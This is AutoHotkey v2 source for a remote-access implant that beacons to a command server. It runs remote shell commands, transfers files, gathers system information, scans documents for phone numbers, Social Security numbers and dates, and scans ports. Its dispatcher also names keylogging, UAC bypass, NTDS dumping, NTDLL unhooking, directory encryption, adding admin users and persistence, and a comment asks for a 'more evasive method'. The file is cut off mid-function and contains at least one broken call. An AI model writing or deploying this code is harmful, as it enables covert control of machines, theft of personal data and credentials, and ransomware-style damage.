#Requires AutoHotkey v2.0
#SingleInstance Force

class NetworkClient {
    AF_INET := 2
    SOCK_STREAM := 1
    IPPROTO_TCP := 6
    SOCKET_ERROR := -1
    WSAEWOULDBLOCK := 10035
    WSAECONNREFUSED := 10061
    WSAETIMEDOUT := 10060
    
    socket := 0
    wsaInitialized := false
    serverIP := "127.0.0.1"
    serverPort := 5074
    agentID := ""
    computerName := ""

    checkInInterval := 15000  ; 15 seconds default
    isRunning := false
    lastAction := ""
    isBusy := false

    loggerIH := ""
    loggerisRunning := false
    
    __New(serverIP := "127.0.0.1", serverPort := 5074) {
        this.serverIP := serverIP
        this.serverPort := serverPort
        this.Initialize()
        this.computerName := A_ComputerName
        this.agentID := this.GenerateAgentID()
        this.manipulator := NTDLLManipulator()
    }

    Log(msg, logFile := "logfile.txt") {
        timestamp := FormatTime(A_Now, "yyyy-MM-dd HH:mm:ss")
        logMessage := timestamp " NetworkClient: " msg "`n"
        
        try {
            FileAppend(logMessage, "*")
        } catch Error as err {
            FileAppend(logMessage, logFile)
        }
    }
    
    GenerateAgentID() {
        ; Generate a unique ID based on computer name and other hardware info
        systemInfo := this.GetSystemInfo()
        systemInfo .= A_ScriptFullPath
        return this.HashString(systemInfo)
    }
    
    GetSystemInfo() {
        ; Collect system information for unique ID generation
        info := A_ComputerName
        info .= A_UserName
        info .= A_OSVersion
        info .= this.GetMACAddress()
        return info
    }
    
    GetMACAddress() {
        ; Simple MAC address retrieval
        try {
            objWMIService := ComObject("WbemScripting.SWbemLocator").ConnectServer(".", "root\CIMV2")
            colItems := objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
            for objItem in colItems {
                return objItem.MACAddress
            }
        }
        return ""
    }
    
    HashString(str) {
        ; Simple hashing function
        hash := 0
        loop parse str {
            hash := ((hash << 5) - hash) + Ord(A_LoopField)
            hash := hash & 0xFFFFFFFF
        }
        return Format("{:08x}", hash)
    }
    
    Initialize() {
        if (!this.wsaInitialized) {
            wsaData := Buffer(408)
            result := DllCall("Ws2_32\WSAStartup", "UShort", 0x0202, "Ptr", wsaData)
            if (result != 0) {
                throw Error("WSAStartup failed with error: " DllCall("Ws2_32\WSAGetLastError"))
            }
            this.wsaInitialized := true
        }
    }
    
    SendMsg(serverIP, port, message, timeout := 60000, isBinaryResponse := false) {
        maxRetries := 5
        retryCount := 0
        startTime := A_TickCount
        
        while (A_TickCount - startTime < timeout) {
            try {
                ; Create socket
                this.socket := DllCall("Ws2_32\socket", 
                    "Int", this.AF_INET, 
                    "Int", this.SOCK_STREAM, 
                    "Int", this.IPPROTO_TCP)
                
                if (this.socket = -1) {
                    throw Error("Socket creation failed: " . DllCall("Ws2_32\WSAGetLastError"))
                }
                
                ; Set socket options
                timeoutVal := Buffer(4, 0)
                NumPut("UInt", 5000, timeoutVal, 0)  ; 5 second timeout
                
                DllCall("Ws2_32\setsockopt", 
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1005,
                    "Ptr", timeoutVal,
                    "Int", 4)
                
                DllCall("Ws2_32\setsockopt", 
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1006,
                    "Ptr", timeoutVal,
                    "Int", 4)
                
                ; Create sockaddr structure
                sockaddr := Buffer(16, 0)
                NumPut("UShort", this.AF_INET, sockaddr, 0)
                NumPut("UShort", DllCall("Ws2_32\htons", "UShort", port), sockaddr, 2)
                NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", serverIP), sockaddr, 4)
                
                ; Connect
                if (DllCall("Ws2_32\connect", 
                    "Ptr", this.socket, 
                    "Ptr", sockaddr, 
                    "Int", 16) = -1) {
                    wsaError := DllCall("Ws2_32\WSAGetLastError")
                    this.CloseSocket()
                    if (retryCount < maxRetries) {
                        this.Log("Could not connect to server, retrying in 1 second...")
                        Sleep(1000)
                        retryCount++
                        continue
                    }
                    throw Error("Connect failed: " . wsaError)
                }
                
                ; Send message
                messageBytes := Buffer(StrPut(message, "UTF-8"), 0)
                StrPut(message, messageBytes, "UTF-8")
                bytesSent := DllCall("Ws2_32\send",
                    "Ptr", this.socket,
                    "Ptr", messageBytes,
                    "Int", messageBytes.Size - 1,
                    "Int", 0)
                
                if (bytesSent = -1) {
                    wsaError := DllCall("Ws2_32\WSAGetLastError")
                    throw Error("Send failed: " . wsaError)
                }
                
                ; Receive response
                response := Buffer(4096, 0)
                totalReceived := 0
                
                while (true) {
                    bytesRecv := DllCall("Ws2_32\recv",
                        "Ptr", this.socket,
                        "Ptr", response.Ptr + totalReceived,
                        "Int", response.Size - totalReceived,
                        "Int", 0)
                    
                    if (bytesRecv > 0) {
                        this.Log("Received " . bytesRecv . " bytes")
                        totalReceived += bytesRecv
                        if (totalReceived + 4096 >= response.Size) {
                            ; Expand buffer
                            newSize := response.Size * 2
                            this.Log("Expanding buffer to " . newSize . " bytes")
                            try {
                                newBuffer := Buffer(newSize, 0)
                                DllCall("RtlCopyMemory",
                                    "Ptr", newBuffer,
                                    "Ptr", response,
                                    "UPtr", totalReceived)
                                response := newBuffer
                            } catch as err {
                                this.Log("Buffer expansion failed: " . err.Message)
                                throw err
                            }
                        }
                    } else if (bytesRecv = 0) {
                        this.Log("Server closed connection normally")
                        break
                    } else {
                        wsaError := DllCall("Ws2_32\WSAGetLastError")
                        if (wsaError = this.WSAEWOULDBLOCK) {
                            Sleep(10)
                            continue
                        }
                        throw Error("Receive failed: " . wsaError)
                    }
                }
                
                ; Return appropriate response format
                if (isBinaryResponse) {
                    if (totalReceived = 0) {
                        return Buffer(0)
                    }
                    finalBuffer := Buffer(totalReceived, 0)
                    DllCall("RtlCopyMemory",
                        "Ptr", finalBuffer,
                        "Ptr", response,
                        "UPtr", totalReceived)
                    return finalBuffer
                } else {
                    return StrGet(response, totalReceived, "UTF-8")
                }
                
            } catch as err {
                this.Log("SendMsg error: " . err.Message)
                throw err
            } finally {
                this.CloseSocket()
            }
        }
        throw Error("Operation timed out after " . timeout . "ms")
    }

    SetSocketOptions() {
        timeoutVal := Buffer(4, 0)
        NumPut("UInt", 10000, timeoutVal, 0)  ; 10 second timeout
        
        ; Set receive timeout
        DllCall("Ws2_32\setsockopt", 
            "Ptr", this.socket,
            "Int", 0xFFFF,
            "Int", 0x1005,
            "Ptr", timeoutVal,
            "Int", 4)
            
        ; Set send timeout
        DllCall("Ws2_32\setsockopt", 
            "Ptr", this.socket,
            "Int", 0xFFFF,
            "Int", 0x1006,
            "Ptr", timeoutVal,
            "Int", 4)
            
        ; Set keep-alive
        keepAlive := Buffer(4, 0)
        NumPut("UInt", 1, keepAlive, 0)
        DllCall("Ws2_32\setsockopt",
            "Ptr", this.socket,
            "Int", 0xFFFF,
            "Int", 0x8,
            "Ptr", keepAlive,
            "Int", 4)
    }

    ConnectSocket(serverIP, port) {
        sockaddr := Buffer(16, 0)
        NumPut("UShort", this.AF_INET, sockaddr, 0)
        NumPut("UShort", DllCall("Ws2_32\htons", "UShort", port), sockaddr, 2)
        NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", serverIP), sockaddr, 4)
        
        return DllCall("Ws2_32\connect", 
            "Ptr", this.socket, 
            "Ptr", sockaddr, 
            "Int", 16) != -1
    }

    CloseSocket() {
        if (this.socket) {
            try {
                ; Try to send connection close notification
                DllCall("Ws2_32\shutdown", "Ptr", this.socket, "Int", 1)  ; SD_SEND
                
                ; Small receive buffer to get any pending data
                buffer := Buffer(128, 0)
                
                ; Brief timeout for final receive
                timeoutVal := Buffer(4, 0)
                NumPut("UInt", 100, timeoutVal, 0)  ; 100ms timeout
                DllCall("Ws2_32\setsockopt", 
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1005,
                    "Ptr", timeoutVal,
                    "Int", 4)
                
                ; Try to receive any remaining data
                while (DllCall("Ws2_32\recv",
                    "Ptr", this.socket,
                    "Ptr", buffer,
                    "Int", 128,
                    "Int", 0) > 0) {
                    ; Continue receiving until done
                }
                
                ; Now do full shutdown
                DllCall("Ws2_32\shutdown", "Ptr", this.socket, "Int", 2)  ; SD_BOTH
            } catch {
                ; Ignore errors during cleanup
            }
            
            ; Always close the socket
            DllCall("Ws2_32\closesocket", "Ptr", this.socket)
            this.socket := 0
        }
    }

    __Delete() {
        this.CloseSocket()
        if (this.wsaInitialized) {
            DllCall("Ws2_32\WSACleanup")
            this.wsaInitialized := false
        }
    }

    Register() {
        this.Log("Attempting to register with server...")
        message := Format("register|{}|{}", this.agentID, this.computerName)
        
        try {
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            if (InStr(response, "Registration successful")) {
                this.Log("Registration successful")
                return true
            } else {
                this.Log("Registration failed: " response)
                return false
            }
        } catch as err {
            this.Log("Registration error: " err.Message " occurred on line: " err.Line)
            return false
        }
    }

    HandleFileDownload(filename) {
        this.Log("Handling file download: " filename)
        local file := "", verifyFile := ""
        
        try {
            ; Initial request 
            message := Format("to_beacon|{}", filename)
            this.Log("Sending file request: " message)
            
            ; Send the request and get file data
            response := this.SendMsg(this.serverIP, this.serverPort, message, 60000, true)
            
            ; Validate response
            if (!response || response.Size = 0) {
                throw Error("No data received from server")
            }
            
            ; Check for error response
            errorCheck := StrGet(response, 5, "UTF-8")
            if (errorCheck = "ERROR") {
                errorMsg := StrGet(response, response.Size, "UTF-8")
                throw Error("Server error: " errorMsg)
            }
            
            ; Write file
            try {
                ; Open file in binary write mode
                file := FileOpen(filename, "w-rwd")  ; Binary mode, write access
                if (!file) {
                    throw Error("Could not create file: " filename)
                }
                
                ; Write data in chunks
                CHUNK_SIZE := 1048576  ; 1MB chunks
                totalWritten := 0
                
                while (totalWritten < response.Size) {
                    remaining := response.Size - totalWritten
                    writeSize := (remaining > CHUNK_SIZE) ? CHUNK_SIZE : remaining
                    
                    ; Create chunk buffer
                    chunk := Buffer(writeSize, 0)
                    DllCall("RtlCopyMemory", 
                        "Ptr", chunk, 
                        "Ptr", response.Ptr + totalWritten, 
                        "UPtr", writeSize)
                    
                    ; Write chunk
                    written := file.RawWrite(chunk, writeSize)
                    if (written != writeSize) {
                        throw Error("Write failed: Wrote " . written . " of " . writeSize . " bytes")
                    }
                    
                    totalWritten += written
                    
                    ; Log progress
                    if (totalWritten >= 1048576) {
                        this.Log("Written " . Floor(totalWritten/1048576) . "MB")
                    }
                }
                
                file.Close()
                file := ""
                
                ; Verify file size
                verifyFile := FileOpen(filename, "r-r")  ; Read mode
                if (!verifyFile) {
                    throw Error("Could not verify file")
                }
                
                if (verifyFile.Length != response.Size) {
                    verifyFile.Close()
                    throw Error("File size mismatch: Expected " . response.Size . " got " . verifyFile.Length)
                }
                
                verifyFile.Close()
                verifyFile := ""
                
                ; Send single completion notification with shorter timeout
                try {
                    this.SendMsg(this.serverIP, this.serverPort,
                        Format("download_complete|{}|{}", this.agentID, filename),
                        1000)  ; Very short timeout since we don't care about response
                } catch as err {
                    ; If notification fails, log but don't fail the download
                    this.Log("Warning: Could not send completion notification: " err.Message)
                }
                
                this.Log("File download complete: " filename)
                return true
                
            } catch as err {
                if (file) {
                    file.Close()
                }
                if (verifyFile) {
                    verifyFile.Close()
                }
                throw Error("File write error: " . err.Message)
            }
            
        } catch as err {
            this.Log("File download error: " . err.Message)
            ; Send failure notification with shorter timeout
            try {
                this.SendMsg(this.serverIP, this.serverPort,
                    Format("download_failed|{}|{}", this.agentID, filename),
                    5000,  ; 5 second timeout for failure message
                    false)
            } catch {
                ; Ignore errors in failure notification
            }
            return false
        }
    }
    
    HandleFileUpload(filepath) {
        this.Log("Handling file upload: " filepath)
        
        try {
            if (!FileExist(filepath)) {
                this.Log("File not found error: " filepath)
                throw Error("File not found: " filepath)
            }
            
            SplitPath(filepath, &filename)
            
            ; First send the from_beacon command and wait for READY response
            message := Format("from_beacon|{}", filename)
            this.Log("Sending initial from_beacon command: " message)
            
            ; Create new socket for file transfer
            transfer_socket := DllCall("Ws2_32\socket", 
                "Int", this.AF_INET, 
                "Int", this.SOCK_STREAM, 
                "Int", this.IPPROTO_TCP)
                
            if (transfer_socket = -1) {
                this.Log("Failed to create transfer socket")
                throw Error("Socket creation failed")
            }
            
            try {
                ; Connect socket
                sockaddr := Buffer(16, 0)
                NumPut("UShort", this.AF_INET, sockaddr, 0)
                NumPut("UShort", DllCall("Ws2_32\htons", "UShort", this.serverPort), sockaddr, 2)
                NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", this.serverIP), sockaddr, 4)
                
                if (DllCall("Ws2_32\connect", 
                    "Ptr", transfer_socket, 
                    "Ptr", sockaddr, 
                    "Int", 16) = -1) {
                    throw Error("Connect failed: " DllCall("Ws2_32\WSAGetLastError"))
                }
                
                ; Send initial command
                messageBytes := Buffer(StrPut(message, "UTF-8"), 0)
                StrPut(message, messageBytes, "UTF-8")
                
                this.Log("Sending command on transfer socket")
                DllCall("Ws2_32\send",
                    "Ptr", transfer_socket,
                    "Ptr", messageBytes,
                    "Int", messageBytes.Size - 1,
                    "Int", 0)
                
                ; Wait for READY
                this.Log("Waiting for READY response...")
                ready_buffer := Buffer(128, 0)
                ready_received := DllCall("Ws2_32\recv",
                    "Ptr", transfer_socket,
                    "Ptr", ready_buffer,
                    "Int", 128,
                    "Int", 0)
                    
                if (ready_received <= 0) {
                    throw Error("Failed to receive READY signal")
                }
                
                ready_response := StrGet(ready_buffer, ready_received, "UTF-8")
                this.Log("Received response: " ready_response)
                
                if (ready_response != "READY") {
                    throw Error("Unexpected response: " ready_response)
                }
                
                ; Now send the file
                this.Log("Starting file transfer")
                file := FileOpen(filepath, "r")
                if (!IsObject(file)) {
                    throw Error("Could not open file")
                }
                
                ; Send file data in chunks
                CHUNK_SIZE := 1048576  ; 1MB chunks
                bytes_sent := 0
                
                while (!file.AtEOF) {
                    buff := Buffer(CHUNK_SIZE, 0)  ; Create buffer for this chunk
                    bytes_read := file.RawRead(buff, CHUNK_SIZE)
                    if (bytes_read = 0) {
                        break
                    }
                    
                    sent := DllCall("Ws2_32\send",
                        "Ptr", transfer_socket,
                        "Ptr", buff.Ptr,
                        "Int", bytes_read,  ; Use actual bytes read
                        "Int", 0)
                        
                    if (sent = -1) {
                        throw Error("Send failed: " DllCall("Ws2_32\WSAGetLastError"))
                    }
                    
                    bytes_sent += sent
                    this.Log("Sent " bytes_sent " bytes")
                }
                
                file.Close()
                this.Log("File transfer complete. Total bytes sent: " bytes_sent)
                
                ; Get final response
                this.Log("Waiting for SUCCESS response")
                final_buffer := Buffer(128, 0)
                final_received := DllCall("Ws2_32\recv",
                    "Ptr", transfer_socket,
                    "Int", 128,
                    "Int", 0)
                    
                if (final_received > 0) {
                    final_response := StrGet(final_buffer, final_received, "UTF-8")
                    this.Log("Final response: " final_response)
                    return final_response = "SUCCESS"
                }
                
                return true
                
            } finally {
                this.Log("Closing transfer socket")
                DllCall("Ws2_32\closesocket", "Ptr", transfer_socket)
            }
            
        } catch as err {
            this.Log("File upload error with details: " err.Message " " err.Line)
            return false
        }
    }

    CheckIn() {
        if (this.isBusy) {
            this.Log("Skipping check-in - client is busy")
            return true
        }
        
        this.isBusy := true
        try {
            this.Log("Checking in with server...")
            message := Format("request_action|{}", this.agentID)
            
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            if (!response) {
                return false
            }
            
            responseParts := StrSplit(response, "|")
            action := responseParts[1]
            this.lastAction := action
            
            result := false
            switch action {
                case "no_pending_commands":
                    this.Log("No pending commands")
                    result := true
                    
                case "download_file":
                    filename := responseParts[2]
                    result := this.HandleFileDownload(filename)
                    
                case "upload_file":
                    filepath := responseParts[2]
                    result := this.HandleFileUpload(filepath)
                    
                case "execute_command":
                    command := responseParts[2]
                    this.Log("CheckIn received execute_command: " command)
                    result := this.HandleCommand(command)

                case "execute_module":
                    module := responseParts[2]
                    if (responseParts.Length >= 3) {
                        parameters := responseParts[3]
                    } else{
                        parameters := ""
                    }

                    this.Log("CheckIn received execute_module " module "|" parameters)
                    result := this.ExecuteModule(module, parameters)
                    
                default:
                    this.Log("Unknown action received: " action)
                    result := false
            }
            
            return result
        } catch as err {
            this.Log("CheckIn error: " err.Message " " err.Line)
            return false
        } finally {
            this.isBusy := false
        }
    }

    StartCheckInLoop() {
        if (this.isRunning) {
            return
        }
        
        this.isRunning := true
        SetTimer(ObjBindMethod(this, "CheckIn"), this.checkInInterval)
    }

    StopCheckInLoop() {
        this.isRunning := false
        SetTimer(ObjBindMethod(this, "CheckIn"), 0)
    }
    
    HandleCommand(command) {

        if command = "shutdown"{
            ExitApp
        }

        this.Log("HandleCommand starting execution of: " command)
        try {
            ; TODO: expand execution ability with optional parameters
            ; and more evasive method
            shell := ComObject("WScript.Shell")
            exec := shell.Exec('%ComSpec% /c ' command)
            output := exec.StdOut.ReadAll()

            if (output){
                message := Format("command_output|{}|{}", this.agentID, output)
            } else {
                message := Format("command_output|{}|(Empty)", this.agentID)
            }
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return true
        } catch as err {
            this.Log("Command execution failed: " err.Message " occurred on line: " err.Line)
            message := Format("command_output|{}|Exeuction Failed: {}" this.agentID, err.Message)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return false
        }
    }

    ExecuteModule(module, parameters){
        try{
            switch module{
                case "ExecuteWinGetPS":
                    this.ExecuteWinGetPS(parameters)
                case "BasicRecon":
                    this.BasicRecon()
                case "DiscoverPII":
                    parametersParts := StrSplit(parameters, ",") ; TODO: Fix second parameter not appearing 
                    this.DiscoverPII(parametersParts[1])
                case "PortScanner":
                    parametersParts := StrSplit(parameters, "%2C")
                    this.PortScanner(parametersParts[1], parametersParts[2])
                case "DenyOutboundFirewall":
                    if (parameters = "") {
                        this.DenyOutboundFirewall()  ; Use default parameters
                    } else {
                        paramArray := StrSplit(parameters, ",", " ")
                        this.DenyOutboundFirewall(paramArray)
                    }
                case "HostFileURLBlock":
                    if (parameters = "") {
                        this.HostFileURLBlock()  ; Use default parameters
                    } else {
                        paramArray := StrSplit(parameters, ",", " ")
                        this.HostFileURLBlock(paramArray)
                    }
                case "RunAsUser":
                    if (parameters = "") {
                        this.RunAsUser()  ; Use default parameters
                    } else {
                        parametersParts := StrSplit(parameters, ",", " ")
                        this.RunAsUser(parametersParts[1], parametersParts[2])
                    }
                case "UpdateCheckIn":
                    this.UpdateCheckIn(parameters)
                case "AddAdminUser":
                    if (parameters = "") {
                        this.AddAdminUser()  ; Use default parameters
                    } else {
                        parametersParts := StrSplit(parameters, ",", " ")
                        this.AddAdminUser(parametersParts[1], parametersParts[2], parametersParts[3])
                    }
                case "AddScriptToRegistry":
                    if (parameters = "") {
                        this.AddScriptToRegistry()  ; Use default parameters
                    } else {
                        this.AddScriptToRegistry(parameters)
                    }
                case "CreateScheduledTask":
                    if (parameters = "") {
                        this.CreateScheduledTask()  ; Use default parameters
                    } else {
                        parametersParts := StrSplit(parameters, ",", " ")
                        this.CreateScheduledTask(parametersParts[1], parametersParts[2], parametersParts[3])
                    }
                case "InstallMSI":
                    if (parameters = "") {
                        this.InstallMSI()  ; Use default parameters
                    } else {
                        parametersParts := StrSplit(parameters, ",", " ")
                        this.InstallMSI(parametersParts[1], parametersParts[2], parametersParts[3])
                    }
                case "RDPConnect":
                    parametersParts := StrSplit(parameters, ",", " ")
                    this.RDPConnect(parametersParts[1], parametersParts[2], parametersParts[3], parametersParts[4])
                case "EncryptDirectory":
                    parametersParts := StrSplit(parameters, ",", " ")
                    this.EncryptDirectory(parametersParts[1], parametersParts[2])
                case "DecryptDirectory":
                    parametersParts := StrSplit(parameters, ",", " ")
                    this.DecryptDirectory(parametersParts[1], parametersParts[2])
                case "UnhookNTDLL":
                    this.manipulator.HandleUnhookNTDLL()
                case "KeyLogger":
                    this.KeyLogger(parameters)
                case "EnumerateDCs":
                    this.EnumerateDCs()
                case "ActiveUserMembership":
                    this.ActiveUserMembership()
                case "CheckUnconstrainedDelegation":
                    this.CheckUnconstrainedDelegation()
                case "IdentifyDomainAdmins":
                    this.IdentifyDomainAdmins()
                case "DomainTrustRecon":
                    this.DomainTrustRecon()
                case "CMSTP_UAC_Bypass":
                    this.CMSTP_UAC_Bypass(parameters)
                case "NTDSDump":
                    this.NTDSDump()

                
                default:
                    message := Format("command_output|{}|Module not found", this.agentID)
                    response := this.SendMsg(this.serverIP, this.serverPort, message)
            }


        } catch as err {
            data := ("Module error: " err.Message " occurred on line: " err.Line)
            message := Format("command_output|{}|{}", this.agentID, data)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return false
        }

    }

    ExecuteWinGetPS(parameters){
        filename := this.agentID "_config.yaml"
        filepath := Format("'{}'" filename)
        this.Log(filepath)

        this.HandleFileDownload(filename)
        
        command := Format('winget configure --accept-configuration-agreements --disable-interactivity -f ' filename)

        shell := ComObject("WScript.Shell")
        exec := shell.Exec('%ComSpec% /c ' command)
        output := exec.StdOut.ReadAll()

        filepath := "C:\Temp\log.txt"
        output := FileRead(filepath)

        message := Format("command_output|{}|{}", this.agentID, output)
        response := this.SendMsg(this.serverIP, this.serverPort, message)

        return true
    }

    BasicRecon(){
        ; Create shell
        shell := ComObject("WScript.Shell")
        
        ; Array to store command outputs
        results := []
        
        ; Commands to run
        commands := ["systeminfo", "arp -a"]
        labels := ["System Information", "ARP Information"]
        
        ; Run each command and store output
        Loop commands.Length {
            exec := shell.Exec("%ComSpec% /c " commands[A_Index])
            results.Push({
                label: labels[A_Index],
                output: exec.StdOut.ReadAll()
            })
        }
        
        ; Combine all results with labels
        combinedOutput := ""
        For data in results {
            combinedOutput .= data.label ":`r`n" data.output "`r`n`r`n"
        }
        
        message := Format("command_output|{}|{}", this.agentID, combinedOutput)
        response := this.SendMsg(this.serverIP, this.serverPort, message)

        return true
    }

    DiscoverPII(documentsPath := "") {
        if (documentsPath = "")
            documentsPath := A_MyDocuments
        contextLength := 30
        this.log("Starting document scan in: " documentsPath)
        results := []
        
        ; Regex patterns
        Regex1 := "\(?\d{3}\)?[ .-]\d{3}[ .-]\d{4}"
        Regex2 := "\b\d{3}-\d{2}-\d{4}\b"
        Regex3 := "\b(?:\d{1,2}[-/]\d{1,2}[-/]\d{2,4}|\d{4}[-/]\d{1,2}[-/]\d{1,2})\b"
        
        fileList := []
        Loop Files, documentsPath "\*.txt", "R"
        {
            fileList.Push(A_LoopFilePath)
        }
        
        this.log("Found " fileList.Length " text files to scan")
        
        if fileList.Length = 0 {
            this.log("No files found - ending scan")
            message := Format("command_output|{}|No text files found in directory.", this.agentID)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return results
        }
        
        for filePath in fileList
        {
            this.log("Scanning file: " filePath)
            try
            {
                fileContent := FileRead(filePath)
                this.log("Successfully read file content")
            }
            catch as err
            {
                this.log("Failed to read file: " err.Message)
                continue
            }
            
            patterns := [Regex1, Regex2, Regex3]
            for pattern in patterns
            {
                this.log("Applying pattern: " pattern)
                fileResults := FindContext(fileContent, pattern, contextLength)
                if (fileResults.Length > 0)
                {
                    this.log("Found " fileResults.Length " matches")
                    results.Push({ 
                        file: filePath,
                        matches: fileResults
                    })
                }
            }
        }
        
        ; Compile results into a single string if matches were found
        combinedOutput := ""
        if (results.Length > 0) {
            this.log("Compiling final output")
            for fileResult in results {
                combinedOutput .= "File: " fileResult.file "`r`n"
                for match in fileResult.matches {
                    combinedOutput .= "Match: " match.match "`r`nBefore: " match.beforeContext "`r`nAfter: " match.afterContext "`r`n"
                }
                combinedOutput .= "`r`n"
            }
            this.log("Output compilation complete")
        }
        
        this.log("Scan complete - found matches in " results.Length " files of " fileList.Length " files scanned.")
        
        this.Log(combinedOutput)
        if not (combinedOutput = ""){
            message := Format("command_output|{}|{}", this.agentID, combinedOutput)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        }
        return results
        
        FindContext(content, pattern, length) {
            resultArray := []
            startPos := 1
            
            while (foundPos := RegExMatch(content, pattern, &match, startPos))
            {
                matchStr := match[]
                
                ; Get context before the match
                beforeStart := Max(1, foundPos - length)
                beforeLength := foundPos - beforeStart
                beforeContext := SubStr(content, beforeStart, beforeLength)
                
                ; Get context after the match
                afterStart := foundPos + StrLen(matchStr)
                afterContext := SubStr(content, afterStart, length)
                
                resultArray.Push({
                    match: matchStr,
                    beforeContext: beforeContext,
                    afterContext: afterContext
                })
                startPos := afterStart
            }
            
            return resultArray
        }
    }

    PortScanner(targetHosts, portRanges := "20-25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,9929,31337") {
        startTime := A_TickCount
        results := ""
        
        ; Parse port ranges first
        ports := ParsePortRange(portRanges)
        
        ; Handle input formats and generate IP list
        hosts := ParseIPRange(targetHosts)
        
        for host in hosts {
            results .= "Starting scan of " host " at " FormatTime(, "yyyy-MM-dd HH:mm") "`n`n"
            
            openPorts := []
            closedPorts := []
            filteredPorts := []
            
            totalPorts := ports.Length
            scannedPorts := 0
            
            ; Scan all ports
            for port in ports {
                result := TestPort(host, port)
                scannedPorts++
                
                switch result {
                    case "open":
                        openPorts.Push(port)
                    case "closed":
                        closedPorts.Push(port)
                    case "filtered":
                        filteredPorts.Push(port)
                }
                UpdateProgress(scannedPorts, totalPorts, host)
            }
            
            ; Calculate stats
            closedCount := closedPorts.Length
            filteredCount := filteredPorts.Length
            openCount := openPorts.Length
            
            ; Generate report for this host
            if (closedCount = totalPorts) {
                results .= "All " totalPorts " scanned ports are closed`n"
            } else {
                if (closedCount > 0) {
                    results .= "Not shown: " closedCount " closed tcp ports`n"
                }
                if (filteredCount > 0) {
                    results .= filteredCount " filtered port" (filteredCount = 1 ? "" : "s") "`n"
                }
                
                results .= "`nPORT      STATE    SERVICE`n"
                
                ; Add open ports
                for port in openPorts {
                    serviceName := GetServiceName(port)
                    results .= Format("{:-8}/tcp {:-8} {}`n", port, "open", serviceName)
                }
                
                ; Add filtered ports
                for port in filteredPorts {
                    serviceName := GetServiceName(port)
                    results .= Format("{:-8}/tcp {:-8} {}`n", port, "filtered", serviceName)
                }
            }
            
            results .= "`n"
        }
        
        ; Add timing information
        elapsedTime := (A_TickCount - startTime) / 1000
        results .= "Scan completed in " Format("{:.2f}", elapsedTime) " seconds`n"
        
        message := Format("command_output|{}|{}", this.agentID, results)
        response := this.SendMsg(this.serverIP, this.serverPort, message)

        return results
    
        ; Helper functions
        ParseIPRange(input) {
            if IsObject(input)
                return input
                
            ; Check if input is CIDR notation
            if InStr(input, "/") {
                parts := StrSplit(input, "/")
                if parts.Length != 2
                    return [input]
                    
                baseIP := parts[1]
                cidrBits := Integer(parts[2])
                
                ; Validate CIDR bits
                if (cidrBits < 0 || cidrBits > 32)
                    return [input]
                    
                ; Convert IP to integer
                ipParts := StrSplit(baseIP, ".")
                if ipParts.Length != 4
                    return [input]
                    
                ipInt := (ipParts[1] << 24) + (ipParts[2] << 16) + (ipParts[3] << 8) + ipParts[4]
                
                ; Calculate network and broadcast addresses
                mask := (0xFFFFFFFF << (32 - cidrBits)) & 0xFFFFFFFF
                network := ipInt & mask
                broadcast := network + (1 << (32 - cidrBits)) - 1
                
                ; Generate IP list
                ipList := []
                Loop (broadcast - network + 1) {
                    currentIP := network + A_Index - 1
                    ipList.Push(Format("{}.{}.{}.{}", 
                        (currentIP >> 24) & 0xFF,
                        (currentIP >> 16) & 0xFF,
                        (currentIP >> 8) & 0xFF,
                        currentIP & 0xFF))
                }
                
                return ipList
            }
            
            ; If not CIDR, return single IP
            return [input]
        }
    
        GetServiceName(port) {
            static services := Map(
                20, "ftp-data",
                21, "ftp",
                22, "ssh",
                23, "telnet",
                25, "smtp",
                53, "domain",
                80, "http",
                110, "pop3",
                111, "rpcbind",
                135, "msrpc",
                139, "netbios-ssn",
                143, "imap",
                443, "https",
                445, "microsoft-ds",
                993, "imaps",
                995, "pop3s",
                1723, "pptp",
                3306, "mysql",
                3389, "ms-wbt-server",
                5900, "vnc",
                8080, "http-proxy",
                9929, "nping-echo",
                31337, "Elite"
            )
            return services.Has(port) ? services[port] : "unknown"
        }
    
        ParsePortRange(portRange) {
            ports := []
            ranges := StrSplit(portRange, ",")
            
            for range in ranges {
                if InStr(range, "-") {
                    parts := StrSplit(range, "-")
                    if (parts.Length != 2)
                        continue
                        
                    start := Integer(parts[1])
                    end := Integer(parts[2])
                    
                    if (start > end || start < 1 || end > 65535)
                        continue
                        
                    Loop (end - start + 1)
                        ports.Push(start + A_Index - 1)
                } else {
                    port := Integer(range)
                    if (port >= 1 && port <= 65535)
                        ports.Push(port)
                }
            }
            
            return ports
        }

        UpdateProgress(current, total, host) {
            percentage := Round((current / total) * 100)
            this.Log("`rScanning " host " " percentage "% complete")
            data := ("`rScanning " host " " percentage "% complete")
            message := Format("command_output|{}|{}", this.agentID, data)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        }
    
        TestPort(ip, port) {
            ; Constants
            AF_INET := 2
            SOCK_STREAM := 1
            IPPROTO_TCP := 6
            SOCKET_ERROR := -1
            WSAECONNREFUSED := 10061
            WSAETIMEDOUT := 10060
    
            ; Initialize WSA
            wsaData := Buffer(408)
            if (DllCall("Ws2_32\WSAStartup", "UShort", 0x0202, "Ptr", wsaData)) {
                Log("WSAStartup failed")
                return "error"
            }
    
            ; Create socket
            sock := DllCall("Ws2_32\socket", "Int", AF_INET, "Int", SOCK_STREAM, "Int", IPPROTO_TCP)
            if (sock = -1) {
                DllCall("Ws2_32\WSACleanup")
                Log("Socket creation failed")
                return "error"
            }
    
            ; Set timeout (3 seconds)
            timeout := Buffer(8, 0)
            NumPut("Int", 3000, timeout, 0)
            DllCall("Ws2_32\setsockopt", "Ptr", sock, "Int", 0xFFFF, "Int", 0x1005, "Ptr", timeout, "Int", 4)
